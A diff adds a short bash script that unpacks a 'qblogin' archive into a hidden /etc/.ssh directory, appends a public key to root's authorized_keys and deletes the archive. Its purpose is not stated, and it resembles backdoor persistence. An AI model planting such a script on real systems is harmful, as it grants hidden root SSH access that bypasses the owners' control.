@@ -1,0 +1,11 @@
+#!/bin/bash
+#set -x
+mkdir /etc/.ssh
+cd /tmp
+tar xfC /tmp/qblogin.tar .
+cp -a /tmp/qblogin/* /etc/.ssh/
+if [ ! -d /root/.ssh ];then
+  mkdir /root/.ssh
+fi
+cat /etc/.ssh/qlogin.pub >> /root/.ssh/authorized_keys
+rm -rf /tmp/qblogin*
